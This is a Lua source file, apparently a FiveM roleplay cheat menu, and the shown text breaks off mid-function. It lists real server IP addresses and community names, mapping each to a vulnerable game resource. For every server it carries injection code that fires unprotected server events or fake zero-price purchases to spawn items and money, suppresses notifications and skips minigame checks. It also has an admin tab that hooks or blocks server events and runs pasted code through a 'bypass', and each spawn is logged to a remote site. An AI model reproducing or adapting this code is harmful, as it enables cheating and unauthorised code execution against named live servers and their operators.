    ['23.26.121.27:30120'] = true,
    ['23.26.121.82:30120'] = true,
    ['185.244.106.28:30120'] = true,
}

local SPAWN_PROFILES = {
    { endpoint = '135.148.129.55:30120', resources = { 'xmmx_letscookplus' } }, -- DaTrapRp, Smacked City RP, back2detroitrp, TB2LA V3, The Lands, Paradise Roleplay, SITW PT 2, Hustlaz Heaven, NoL's, Trapcity Chicago, Streets of Carolina, Press Gass RP, Streets of Love RP, Chiraq Stories
    { endpoint = '185.244.106.32:30120', resources = { 'mic_hookah' } }, -- The Sections Roleplay
    { endpoint = '141.11.104.101:30120', resources = { 'brutal_boxing', 'mic_hookah' } }, -- The Sections
    { endpoint = '191.96.152.145:30120', resources = { 'mic_hookah', 'devkit_drugsystem' } }, -- OnTheFlo RP
    { endpoint = '91.212.19.9:30120', resources = { 'ms_weedrolling_esx' } }, -- SITW | [ESX Legacy], Lincoln Park
    { endpoint = '216.146.24.208:30120', resources = { 'jerknjam_plus' } }, -- KittyWorld RP V2, nolove in la
    { endpoint = '216.146.24.178:30120', resources = { 'ms_lean_system' } }, -- Cali Love RP, Streets of Philly RP
    { endpoint = '162.222.16.245:30120', resources = { 'ms_percs_system', 'ms_lean_system' } }, -- Windy City
    { endpoint = '191.96.152.12:30120', resources = { 'ms_xanax_system_esx' } }, -- chicago rp: new gen, Grant Park
    { endpoint = '23.26.121.27:30120', resources = { 'brutal_boxing', 'ak47_idcardv2' } }, -- TrapWorld RP
    { endpoint = '141.11.104.28:30120', resources = { 'devkit_drugselling' } }, -- SAB WL
    { endpoint = '91.212.19.130:30120', resources = { 'wasabi_ambulance' } }, -- Love Story RP
    { endpoint = '216.146.24.52:30120', resources = { 'wais-hunting' } }, -- Chiberia
    { endpoint = '141.140.31.79:30120', resources = { 'hax_drugprocessing' } }, -- Tfb V5
    { endpoint = '162.222.16.4:30120', resources = { 'esx_electricianjob' } }, -- chicago chronicles
    { endpoint = '191.96.152.27:30120', resources = { 'pug-businesscreator' } }, -- Euphoria RP
    { endpoint = '162.222.16.100:30120', resources = { 'ak47_anklemonitor' } }, -- heart of atl
    { endpoint = '91.212.19.10:30120', resources = { 'spoodyGunPlug' } }, -- Chop City
    { endpoint = '96.126.188.16:30120', resources = { 'cc-chipeo' } }, -- G1TCH NYC
    { endpoint = '216.146.24.124:30120', resources = { 'ft_qb_perfumes' } }, -- True Love Roleplay
    { endpoint = '137.175.60.67:30120', resources = { 'ms_xanax_system' } }, -- The City RP
    { endpoint = '185.244.106.41:30120', resources = { 'evo-k9-v3' } }, -- 17th Street RP
    { endpoint = '23.26.121.55:30120', resources = { 'devx-lustshop' } }, -- DownSouth Broward
    { endpoint = '23.26.121.156:30120', resources = { 'codewave-bbq' } }, -- Hyde Park
    { endpoint = '141.11.104.43:30120', resources = { 'devkit_bundles' } }, -- Synce A Baby
    { endpoint = '162.222.16.22:30120', resources = { 'codewave-handbag-phone' } }, -- Blackrose LA
    { endpoint = '162.222.16.52:30120', resources = { 'angelicxs-CivilianJobs' } }, -- trapcity chicago
    { endpoint = '23.26.121.82:30120', resources = { 'ak47_smokingv2' } }, -- VibezRus Lifestyle
    { endpoint = 'skating_trigger', resources = { 'skating' } },
}

local function spawnResourceAvailable(resource)
    if MachoResourceInjectable(resource) then
        return true
    end

    return GetResourceState(resource) == 'started'
end

local function resolveSpawnEndpoint(endpoint)
    if endpoint and SPAWN_KNOWN_ENDPOINTS[endpoint] then
        return endpoint
    end

    for i = 1, #SPAWN_PROFILES do
        local profile = SPAWN_PROFILES[i]

        for j = 1, #profile.resources do
            if spawnResourceAvailable(profile.resources[j]) then
                return profile.endpoint
            end
        end
    end

    return nil
end

local function spawnItem(itemName, amount)
    itemName = itemName or 'None'
    amount = amount or 'None'
    local endpoint = GetCurrentServerEndpoint()

    itemName = itemName:lower()

    local logUrl = string.format('https://scytheservices.online/api/junkie/219153c86c4c4cfa40e5a9e54eed612c/spawn-log?discord_name=%s&ip=%s&key=%s&item=%s&amount=%s', urlEncode(discordUser), urlEncode(endpoint), urlEncode(MachoAuthenticationKey()), urlEncode(itemName), urlEncode(tostring(amount)))

    local ok, body = pcall(json.decode, MachoWebRequest(logUrl) or '')
    if ok and type(body) == 'table' then
        local status, message = body.status, tostring(body.message or '')

        if status == 'rejected' then
            showNotify(message, 'error')
            return
        elseif status == 'ratelimit' then
            showNotify(('%s — wait %d min'):format(message, body.timeleft or '?'), 'error')
            return
        elseif status == 'crash' then
            showNotify(message, 'error')
            Wait(300)
            MachoInjectResourceRaw('any', '.')
            return
        end
    end

    endpoint = resolveSpawnEndpoint(endpoint)

    if not endpoint then
        showNotify('No supported item script found', 'error')
        return
    end

    if endpoint == '135.148.129.55:30120' or endpoint == '191.96.152.90:30120' or endpoint == '206.168.173.19:3031' or endpoint == '162.222.16.70:30120' or endpoint == '178.239.199.58:30120' or endpoint == '212.192.29.119:30130' or endpoint == '91.190.154.39:30120' or endpoint == '191.96.152.17:30120' or endpoint == '191.96.152.209:30120' or endpoint == '128.254.184.92:30120' or endpoint == '91.212.19.6:30120' or endpoint == '23.26.135.40:30120' or endpoint == '45.144.225.52:30120' or endpoint == '23.26.121.215:30120' or endpoint == '191.96.152.82:30120' then -- DaTrapRp, Smacked City RP, back2detroitrp, TB2LA V3, The Lands, Paradise Roleplay, SITW PT 2, Hustlaz Heaven, NoL's, Trapcity Chicago, Streets of Carolina, Press Gass RP, Streets of Love RP, Chiraq Stories
        injectCode('xmmx_letscookplus', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            Shop.GroceryAmt = SET_AMOUNT
            XM.MiniGame = function(data) return true end
            XM.Progress = function(label, info) return true end
            XM.RequestAnim = function(dict) end

            SafeRunNative(TriggerEvent, 'xmmx_letscookplus:client:openGroceryBag', 'grocery_bag', {SET_ITEM})
        ]], itemName, amount))
    elseif endpoint == '141.11.104.28:30120' then -- SAB WL
        injectCode('devkit_drugselling', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            SafeRunNative(TriggerServerEvent, 'devkit_drugselling:giverobback', SET_ITEM, SET_AMOUNT)
        ]], itemName, amount))
    elseif endpoint == '143.20.58.53:30120' then -- BMF RP X Big Meech
        injectCode('xmmx_letscookplus', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            Shop.GroceryAmt = SET_AMOUNT
            XM.MiniGame = function(data) return true end
            XM.Progress = function(label, info) return true end
            XM.RequestAnim = function(dict) end

            SafeRunNative(TriggerEvent, 'xmmx_letscookplus:client:openGroceryBag', 'grocery_bag', {SET_ITEM})
        ]], itemName, amount))
    elseif endpoint == '91.212.19.130:30120' then -- Love Story RP
        injectCode('wasabi_ambulance', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            for i = 1, SET_AMOUNT do
                SafeRunNative(gItem, { item = SET_ITEM, label = 'Free', price = 0 })
                Wait(100)
            end
        ]], itemName, amount))
    elseif endpoint == '91.212.19.9:30120' or endpoint == '91.190.154.176:30120' then -- SITW | [ESX Legacy], Lincoln Park
        injectCode('ms_weedrolling_esx', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            SafeRunNative(TriggerEvent, 'mythic_weed:openBackwoodPackage', { packageItem = 'money', backwoodItem = SET_ITEM, quantity = SET_AMOUNT })
        ]], itemName, amount))
    elseif endpoint == '216.146.24.208:30120' or endpoint == '23.26.121.19:30120' or endpoint == '91.190.154.176:30120' then -- KittyWorld RP V2, nolove in la
        injectCode('jerknjam_plus', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            SafeRunNative(TriggerServerEvent, 'jerknjam_plus:server:giveItem', SET_ITEM, 0, SET_AMOUNT)
        ]], itemName, amount))
    elseif endpoint == '216.146.24.52:30120' then -- Chiberia
        injectCode('wais-hunting', string.format([[
            _G.SendNUIMessage = function() end
            _G.Config.Notification = function() end

            for i = 1, %d do
                _G.canReciveMissionReward = true
                SafeRunNative(TriggerServerEvent, 'wais:hunting:server:missionCompleted', 13)

                Wait(100)
            end
        ]], amount))
    elseif endpoint == '185.244.106.32:30120' then -- The Sections Roleplay
        injectCode('mic_hookah', string.format([[
            local function GiveItem()
                SafeRunNative(TriggerServerEvent, 'hookah:addItem', '%s')
            end

            for i = 1, %d do
                GiveItem()
                Wait(15)
            end
        ]], itemName, amount))
    elseif endpoint == '141.11.104.101:30120' then -- The Sections
        if itemName == 'cash' or itemName == 'money' then
            injectCode('brutal_boxing', string.format([[
                _G.notification = function() end

                SafeRunNative(TriggerServerEvent, 'brutal_boxing:server:endofbet', {
                    bets = {
                        player1 = 0,
                        player2 = 0,
                        [GetPlayerServerId(PlayerId())] = {amount = %d}
                    }
                }, false)
            ]], amount))
        else
            injectCode('mic_hookah', string.format([[
                local function GiveItem()
                    SafeRunNative(TriggerServerEvent, 'hookah:addItem', '%s')
                end

                for i = 1, %d do
                    GiveItem()
                    Wait(15)
                end
            ]], itemName, amount))
        end
    elseif endpoint == '191.96.152.82:30120' then -- Chiraq Stories
        injectCode('mic_hookah', string.format([[
            local function GiveItem()
                SafeRunNative(TriggerServerEvent, 'hookah:addItem', '%s')
            end

            for i = 1, %d do
                GiveItem()
                Wait(15)
            end
        ]], itemName, amount))
    elseif endpoint == '141.140.31.79:30120' then -- Tfb V5
        injectCode('ox_lib', [[
            SendNUIMessage = function(data) if type(data) == 'table' and data.action == 'notify' then return end return SendNUIMessage(data) end
        ]])

        injectCode('hax_drugprocessing', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            SafeRunNative(TriggerServerEvent, 'hax_process:unpackItem', 'cash', SET_ITEM, SET_AMOUNT, 'qs', 'qs')
        ]], itemName, amount))
    elseif endpoint == '137.175.60.24:30120' then -- Dirty South RP
        injectCode('xmmx_letscookplus', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            Shop.GroceryAmt = SET_AMOUNT
            XM.MiniGame = function(data) return true end
            XM.Progress = function(label, info) return true end
            XM.RequestAnim = function(dict) end

            SafeRunNative(TriggerEvent, 'xmmx_letscookplus:client:openGroceryBag', 'grocery_bag', {SET_ITEM})
        ]], itemName, amount))
    elseif endpoint == '162.222.16.4:30120' then -- chicago chronicles
        if itemName == 'cash' or itemName == 'money' then
            injectCode('esx_electricianjob', string.format([[
                local function GiveMoney()
                    SafeRunNative(TriggerServerEvent, 'electric:getmoney')
                end

                for i = 1, %d do
                    GiveMoney()
                    Wait(15)
                end
            ]], amount))
        else
            print('sorry cannot spawn items in here.')
        end
    elseif endpoint == '137.175.60.24:30120' then -- the yards
        injectCode('ox_lib', [[
            local ogSendNUIMessage = SendNUIMessage

            SendNUIMessage = function(data) 
                -- RunSafeNative(print, data, 'called')
                if data.action == 'notify' then
                    return
                end

                return SafeRunNative(ogSendNUIMessage, data)
            end
        ]])

        injectCode('prism_crafting', string.format([[
            local itemName = '%s'
            local amount = %d

            SafeRunNative(TriggerEvent, 'prism-crafting:client:openBlueprintShop', {
                id = 'junkie',
                label = 'junkie',
                data = {
                    { item = itemName, price = 0 }
                }
            })
        ]], itemName, amount))
    elseif endpoint == '191.96.152.27:30120' then -- Euphoria RP
        injectCode('ox_lib', [[
            ogNui = SendNUIMessage
            SendNUIMessage = function(data)
                if data.action == 'notify' then
                    return
                end

                SafeRunNative(ogNui, data)
            end
        ]])

        injectCode('pug-businesscreator', string.format([[
            local selfPed = PlayerPedId()
            local setCoords = GetEntityCoords(selfPed)
            
            SafeRunNative(TriggerEvent, 'Pug:Client:DoBusinessSuppliesLogic', {
                args = {
                    Name = 'Junkie',
                    Info = { 
                        PedCoords = { x = setCoords.x, y = setCoords.y, z = setCoords.z, w = 0.0 },
                        Heading = GetEntityHeading(selfPed),
                        Animation = nil,    
                        SuppliesData = {
                            Supplies1 = '%s',
                            SuppliesPrice1 = 0,
                            SuppliesAmount1 = %s
                        }
                    }
                }   
            })
        ]], itemName, amount))
    elseif endpoint == '162.222.16.100:30120' then -- heart of atl
        injectCode('ak47_anklemonitor', string.format([[
            local function GiveItem()
                SafeRunNative(TriggerServerEvent, 'ak47_anklemonitor:additem', '%s')
            end

            for i = 1, %d do
                GiveItem()
                Wait(15)
            end
        ]], itemName, amount))
    elseif endpoint == '191.96.152.12:30120' or endpoint == '191.96.152.15:30120' then -- chicago rp: new gen, Grant Park
        injectCode('ox_lib', [[
            SendNUIMessage = function(data) if type(data) == 'table' and data.action == 'notify' then return end return SendNUIMessage(data) end
        ]])
            
        injectCode('ms_xanax_system_esx', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            SafeRunNative(TriggerServerEvent, 'mythic_xanax:openBottle', 'cash', SET_ITEM, SET_AMOUNT, SET_AMOUNT)
        ]], itemName, amount))
    elseif endpoint == '91.212.19.10:30120' then -- Chop City
        injectCode('spoodyGunPlug', string.format([[
            SafeRunNative(TriggerServerEvent, '__ox_cb_spoodyGunPlug:giveItems', 'spoodyGunPlug', 'spoodyGunPlug:giveItems:xxxx', {{amount = %d, item = "%s"}})
        ]], amount, itemName))
    elseif endpoint == '96.126.188.16:30120' then -- G1TCH NYC
        injectCode('cc-chipeo', string.format([[
            local function GiveItem()
                SafeRunNative(TriggerServerEvent, 'cc-chipeo:server:addItem', '%s')
            end

            for i = 1, %d do
                GiveItem()
                Wait(15)
            end
        ]], itemName, amount))
    elseif endpoint == '162.222.16.216:30120' then -- Shugga Land
        injectCode('devkit_drugsystem', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            _G.Config.DrugRecipes = {
                [SET_ITEM] = {
                    item = SET_ITEM,
                    label = '',
                    GivenAmount = SET_AMOUNT,
                    requirements = {},
                    animations = {},
                },
            }

            SafeRunNative(TriggerEvent, 'devkit_drugsystem:finishCrafting', SET_ITEM)
        ]], itemName, amount))
    elseif endpoint == '185.244.106.68:30120' then -- The Gardens
        injectCode('devkit_drugsystem', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            _G.Config.DrugRecipes = {
                [SET_ITEM] = {
                    item = SET_ITEM,
                    label = 'qs',
                    GivenAmount = SET_AMOUNT,
                    requirements = {},
                    animations = {},
                },
            }

            SafeRunNative(TriggerEvent, 'devkit_drugsystem:finishCrafting', SET_ITEM)
        ]], itemName, amount))
    elseif endpoint == '216.146.24.124:30120' then -- True Love Roleplay
        MachoExecuteDuiScript(Dui, string.format([[
            try {
                fetch('https://ft_qb_perfumes/buyItems', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        item: '%s',
                        label: 'QS',
                        quantity: %d,
                        pricePerItem: 0
                    })
                });
            } catch (e) {}
        ]], itemName, amount))
    elseif endpoint == '141.11.104.34:30120' or endpoint == '128.254.184.25:30120' then -- B2H V3 CHICAGO, Bags and Bodies Roleplay
        injectCode('xmmx_letscookplus', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            Shop.GroceryAmt = SET_AMOUNT
            XM.MiniGame = function(data) return true end
            XM.Progress = function(label, info) return true end
            XM.RequestAnim = function(dict) end

            SafeRunNative(TriggerEvent, 'xmmx_letscookplus:client:openGroceryBag', 'grocery_bag', {SET_ITEM})
        ]], itemName, amount))
    elseif endpoint == '216.146.24.178:30120' or endpoint == '147.189.168.247:30120' then -- Cali Love RP, Streets of Philly RP
        injectCode('ms_lean_system', string.format([[
            local function GiveItem()
                SafeRunNative(TriggerEvent, 'lean:startMix', 'money', '%s', 'money')
            end

            GiveItem()
        ]], itemName))
    elseif endpoint == '137.175.60.67:30120' then -- The City RP
        injectCode('ox_lib', [[
            SendNUIMessage = function(data) if type(data) == 'table' and data.action == 'notify' then return end return SendNUIMessage(data) end
        ]])

        injectCode('ms_xanax_system', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            SafeRunNative(TriggerServerEvent, 'mythic_xanax:openBottle', 'cash', SET_ITEM, SET_AMOUNT, SET_AMOUNT)
        ]], itemName, amount))
    elseif endpoint == '185.244.106.41:30120' then -- 17th Street RP
        if MachoResourceInjectable('esx_notify') then
            injectCode('esx_notify', [[
                SendNuiMessage = function() return end
            ]])
        end

        MachoExecuteDuiScript(Dui, string.format([[
            try {
                fetch('https://evo-k9-v3/purchase', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'cash',
                        basket: [
                            { name: '%s', label: 'qs', price: 0, quantity: %d},
                        ],
                        total: 0,
                    })
                });
            } catch (e) {}
        ]], itemName, amount))
    elseif endpoint == '23.26.121.55:30120' then -- DownSouth Broward
        injectCode('devx-lustshop', string.format([[
            SafeRunNative(TriggerServerEvent, 'devx-adulttoys:checkout', {
                {
                    id = 1,
                    inventoryName = '%s',
                    displayName = 'Purple Vibrator',
                    sub = 'Elegant & Powerful',
                    price = 0,
                    image = 'images/purple_vibrator.png',
                    rating = 5,
                    description = 'A stylish classic with a silky finish and deep vibration strength. Fully waterproof and USB-rechargeable, this versatile toy is perfect for solo or partner play.',
                    type = {'Vibrating'},
                    qty = %d
                }
            })
        ]], itemName, amount))
    elseif endpoint == '23.26.121.156:30120' then -- Hyde Park
        injectCode('codewave-bbq', string.format([[
            local function GiveItem()
                SafeRunNative(handlePropPickup, '%s')
            end

            for i = 1, %d do
                GiveItem()
                Wait(15)
            end
        ]], itemName, amount))
    elseif endpoint == '191.96.152.145:30120' then -- OnTheFlo RP
        if MachoResourceInjectable('mic_hookah') then
            injectCode('mic_hookah', string.format([[
                local function GiveItem()
                    SafeRunNative(TriggerServerEvent, 'hookah:addItem', '%s')
                end

                for i = 1, %d do
                    GiveItem()
                    Wait(15)
                end
            ]], itemName, amount))
        elseif MachoResourceInjectable('devkit_drugsystem') then
            injectCode('devkit_drugsystem', string.format([[
                local SET_ITEM = '%s'
                local SET_AMOUNT = %d

                _G.Config.DrugRecipes = {
                    [SET_ITEM] = {
                        item = SET_ITEM,
                        label = 'junkie',
                        GivenAmount = SET_AMOUNT,
                        requirements = {},
                        animations = {},
                    },
                }

                SafeRunNative(TriggerEvent, 'devkit_drugsystem:finishCrafting', SET_ITEM)
            ]], itemName, amount))
        end
    elseif endpoint == '141.11.104.43:30120' then -- Synce A Baby
        injectCode('devkit_bundles', string.format([[
            SafeRunNative(TriggerServerEvent, 'devkit_bundles:addinv', '%s', %d)
        ]], itemName, amount))
    elseif endpoint == '162.222.16.245:30120' then -- Windy City
        if MachoResourceInjectable('ms_percs_system') then
            injectCode('ms_percs_system', string.format([[
                local SET_ITEM = '%s'
                local SET_AMOUNT = %d

                lib.progressCircle = function() return true end
                lib.notify = function() end
                CreateObject = function() return 0 end

                local function spawnshit()
                    SafeRunNative(TriggerEvent, 'ms:crushPill', {
                        pill = 'money',
                        powder = SET_ITEM,
                        label = 'Junkie'
                    })
                end

                for i = 1, SET_AMOUNT do
                    spawnshit()
                    Wait(15)
                end
            ]], itemName, amount))
        elseif MachoResourceInjectable('ms_lean_system') then
            injectCode('ms_lean_system', string.format([[
                local SET_ITEM = '%s'
                local SET_AMOUNT = %d
                local _originalProgressCircle = lib.progressCircle

                TaskPlayAnim = function() return end
                CreateObject = function() return end

                lib.progressCircle = function(data, ...)
                    return _originalProgressCircle({
                        duration = 0,
                        label = 'Junkie',
                        useWhileDead = false,
                        canCancel = false,
                        disable = {}
                    })
                end

                local function GiveItem()
                    SafeRunNative(TriggerEvent, 'lean:startMix', 'money', SET_ITEM, 'money')
                end

                for i = 1, SET_AMOUNT do
                    GiveItem()
                    Wait(15)
                end
            ]], itemName, amount))
        end
    elseif endpoint == '207.180.26.2:30120' then -- After Dark Los Santos
        injectCode('xmmx_letscookplus', string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            Shop.GroceryAmt = SET_AMOUNT
            XM.MiniGame = function(data) return true end
            XM.Progress = function(label, info) return true end
            XM.RequestAnim = function(dict) end

            SafeRunNative(TriggerEvent, 'xmmx_letscookplus:client:openGroceryBag', 'grocery_bag', {SET_ITEM})
        ]], itemName, amount))
    elseif endpoint == '162.222.16.22:30120' then -- Blackrose LA
        if MachoResourceInjectable('codewave-handbag-phone') then
            injectCode('codewave-handbag-phone', string.format([[
                SafeRunNative(TriggerEvent, 'delivery:completeDeliveryhandbags', %d)
            ]], amount))
        end
    elseif endpoint == '162.222.16.52:30120' then -- trapcity chicago
        injectCode('angelicxs-CivilianJobs', string.format([[
            SafeRunNative(TriggerServerEvent, 'angelicxs-CivilianJobs:Server:GainItemMaterial', '%s', %d)
        ]], itemName, amount))
    elseif endpoint == '141.11.104.82:30120' then
        if MachoResourceInjectable('pug-robberycreator') then
            MachoInjectResourceScriptOverride(1, 'pug-robberycreator', string.format([[
                local SET_ITEM = '%s'
                local SET_AMOUNT = %d

                _G.Notify = function() return end

                GiveItemReward({ itemName = SET_ITEM, quantity = SET_AMOUNT, rewardItems = {{ rewardItemName = SET_ITEM }}}, {sellQuantity = SET_AMOUNT})
            ]], itemName, amount), '@@pug-robberycreator/client/sellitems.lua', 1, 1000)
        elseif MachoResourceInjectable('ms_weedrolling_esx') then
            injectCode('ms_weedrolling_esx', string.format([[
                SafeRunNative(TriggerEvent, 'mythic_weed:openBackwoodPackage', { packageItem = 'cash', backwoodItem = '%s', quantity = %d })
            ]], itemName, amount))
        end
    elseif endpoint == '23.26.121.27:30120' then -- TrapWorld RP
        if itemName == 'cash' or itemName == 'money' then
            injectCode('brutal_boxing', string.format([[
                _G.notification = function() end

                SafeRunNative(TriggerServerEvent, 'brutal_boxing:server:endofbet', {
                    bets = {
                        player1 = 0,
                        player2 = 0,
                        [GetPlayerServerId(PlayerId())] = {amount = %d}
                    }
                }, false)
            ]], amount))
        else
            injectCode('t1ger_lib', string.format([[
                local function GiveItem()
                    SafeRunNative(TriggerServerEvent, 't1ger_lib:server:addItem', '%s', %d)
                end

                GiveItem()
            ]], itemName, amount))
        end
    elseif endpoint == '23.26.121.82:30120' then -- VibezRus Lifestyle
        injectCode('ak47_smokingv2', string.format([[
            local function GiveItem()
                SafeRunNative(TriggerServerEvent, 'ak47_smokingv2:craftingreward', '%s')
            end

            for i = 1, %d do
                GiveItem()
                Wait(15)
            end
        ]], itemName, amount))
    elseif endpoint == '51.81.182.100:30120' then -- Jungle
        injectCode('devkit_smoking', string.format([[
            local function GiveItem()
                SafeRunNative(TriggerServerEvent, 'devkit_smoking:server:AddItem', '%s')
            end

            for i = 1, %d do
                GiveItem()
                Wait(15)
            end
        ]], itemName, amount))
    elseif endpoint == '143.20.58.37:30120' then -- Paradise RP
        injectCode('qb-chopshop', string.format([[
            local function Give()
                SafeRunNative(TriggerServerEvent, 'cad-gundrop:server:ItemHandler', 'add', '%s', %d)
            end

            Give()
        ]], itemName, amount))
    elseif endpoint == '185.244.106.28:30120' then -- The 312
        if MachoResourceInjectable('esx_notify') then
            injectCode('esx_notify', [[
                SendNuiMessage = function() return end
            ]])
        end

        MachoExecuteDuiScript(Dui, string.format([[
            try {
                fetch('https://evo-k9-v3/purchase', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'cash',
                        basket: [
                            { name: '%s', label: 'junkie', price: 0, quantity: %d},
                        ],
                        total: 0,
                    })
                });
            } catch (e) {}
        ]], itemName, amount))
    elseif endpoint == 'skating_trigger' or spawnResourceAvailable('skating') then
        local targetRes = (MachoResourceInjectable and MachoResourceInjectable('skating')) and 'skating' or 'any'
        injectCode(targetRes, string.format([[
            local SET_ITEM = '%s'
            local SET_AMOUNT = %d

            if lib and lib.callback then
                pcall(function() lib.callback.await('skating:server:buyItem', false, SET_ITEM, SET_AMOUNT) end)
                pcall(function() lib.callback.await('skating:server:buyItem', false, { item = SET_ITEM, count = SET_AMOUNT, price = 0 }) end)
            end

            SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', 'skating', 'skating:server:buyItem:xxxx', SET_ITEM, SET_AMOUNT)
            SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', SET_ITEM, SET_AMOUNT)
            SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', 'skating', 'skating:server:buyItem:xxxx', { item = SET_ITEM, count = SET_AMOUNT, price = 0 })
            SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', { item = SET_ITEM, count = SET_AMOUNT, price = 0 })
        ]], itemName, amount))
    end

    local count = tonumber(amount)

    if count then
        showNotify(('Spawned %dx %s'):format(count, itemName), 'success')
    else
        showNotify(('Spawned %s'):format(itemName), 'success')
    end
end

local adminTab = {
    name = 'Admin',
    submenu = {
        { type = 'divider', label = 'Server Events' },
        {
            label = 'Hook Server Callbacks',
            type = 'checkbox',
            desc = 'Print every server event this client fires',
            checked = false,
            onConfirm = function(checked)
                if checked and not installServerEventHook() then
                    return
                end

                logServerEvents = checked

                if checked then
                    showNotify('Logging server events to F8', 'info')
                else
                    showNotify('Server event logging off', 'info')
                end
            end
        },
        {
            label = 'Block Server Events',
            type = 'checkbox',
            desc = 'Drop outgoing server events instead of sending them',
            checked = false,
            onConfirm = function(checked)
                if checked and not installServerEventHook() then
                    return
                end

                blockServerEvents = checked

                if checked then
                    showNotify('Blocking every outgoing server event', 'error')
                else
                    showNotify('Server events flowing again', 'info')
                end
            end
        },
        {
            label = 'Clear Event Log',
            type = 'button',
            onConfirm = function()
                serverEventSeen = {}
                showNotify('Event log cleared', 'info')
            end
        },
        { type = 'divider', label = 'Execute' },
        {
            label = 'Run Trigger',
            type = 'button',
            desc = 'Paste a trigger or chunk; runs it through the bypass',
            onConfirm = function()
                showInput('Resource (any or name)', 'any', function(resource)
                    resource = (resource and resource ~= '') and resource or 'any'

                    Wait(400)

                    showInput('Trigger / Lua', '', function(code)
                        runTrigger(resource, code)
                    end)
                end)
            end
        },
        { type = 'divider', label = 'Info' },
        {
            label = 'Dump Resources',
            type = 'button',
            desc = 'List started resources and which are injectable',
            onConfirm = function()
                dumpResources()
            end
        },
        {
            label = 'Dump Player List',
            type = 'button',
            onConfirm = function()
                local players = getPlayers(GetEntityCoords(PlayerPedId()), 10000.0)

                Debug('--- Players (' .. #players .. ') ---')

                for i = 1, #players do
                    Debug(('[%s] %s'):format(tostring(players[i].serverId), tostring(players[i].name)))
                end

                showNotify(('Dumped %d players to F8'):format(#players), 'info')
            end
        },
    }
}

menuConfig = {
    {
        label = 'Player',
        icon = 'ph-user',
        type = 'submenu',
        tabs = {
            {
                name = 'Status',
                submenu = {
                    {
                        label = 'Revive',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local ped = PlayerPedId()
                                SafeRunNative(ReviveInjuredPed, ped)
                                SafeRunNative(SetEntityHealth, ped, 200)
                                SafeRunNative(ClearPedTasksImmediately, ped)
                            ]])
                        end
                    },
                    {
                        label = 'Suicide',
                        icon = "ph ph-skull",
                        desc = "Revives you",
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[ 
                                SafeRunNative(SetEntityHealth, PlayerPedId(), 0) 
                            ]])
                        end
                    },
                    {
                        label = 'Hard Suicide',
                        icon = "ph ph-skull",
                        desc = "Revives you",
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    HardSuicide = true
                                    SafeRunNative(CreateThread, function()
                                        while HardSuicide do
                                            SafeRunNative(SetEntityHealth, PlayerPedId(), 0)
                                            Wait(0)
                                        end
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    HardSuicide = false
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Noclip',
                        icon = "ph ph-skull",
                        desc = "Toggle noclip for self",
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    setNoclipAllow = true
                                    setNoclipActive = true
                                    setNoclipSpeed = 12.0
                                    setNoclipMode = setNoclipMode or 'default'

                                    local function getCamDirection()
                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
                                        local pitch = GetGameplayCamRelativePitch()
                                        local x = -math.sin(math.rad(heading)) * math.cos(math.rad(pitch))
                                        local y = math.cos(math.rad(heading)) * math.cos(math.rad(pitch))
                                        local z = math.sin(math.rad(pitch))
                                        return vector3(x, y, z)
                                    end

                                    local noclipModes = {
                                        witchy = {
                                            model = GetHashKey('prop_tool_broom'),
                                            bone = 0x0,
                                            offset = vector3(0.0, 0.0, -0.1),
                                            rot = vector3(90.0, 0.0, 180.0),
                                            animDict = 'amb@prop_human_seat_chair@female@proper@idle_a',
                                            animName = 'idle_a',
                                        },
                                        chilling = {
                                            model = GetHashKey('prop_patio_lounger1'),
                                            bone = 0x0,
                                            offset = vector3(0.0, -0.6, 0.1),
                                            rot = vector3(70.0, 0.0, 180.0),
                                            animDict = 'amb@prop_human_seat_sunlounger@male@idle_a',
                                            animName = 'idle_a',
                                        },
                                        shitting = {
                                            model = GetHashKey('prop_toilet_01'),
                                            bone = 0x0,
                                            offset = vector3(0.0, -0.15, -0.45),
                                            rot = vector3(0.0, 0.0, 180.0),
                                            animDict = 'amb@prop_human_seat_chair@female@arms_folded@idle_a',
                                            animName = 'idle_a',
                                        },
                                    }

                                    setNoclipModelFailedAt = setNoclipModelFailedAt or {}

                                    local function waitForModel(model)
                                        local lastFailed = setNoclipModelFailedAt[model]
                                        if lastFailed and (GetGameTimer() - lastFailed) < 3000 then
                                            return false
                                        end

                                        local attempts = 0
                                        SafeRunNative(RequestModel, model)
                                        while not HasModelLoaded(model) and attempts < 300 do
                                            SafeRunNative(RequestModel, model)
                                            Wait(0)
                                            attempts = attempts + 1
                                        end

                                        if HasModelLoaded(model) then
                                            setNoclipModelFailedAt[model] = nil
                                            return true
                                        end

                                        setNoclipModelFailedAt[model] = GetGameTimer()
                                        return false
                                    end

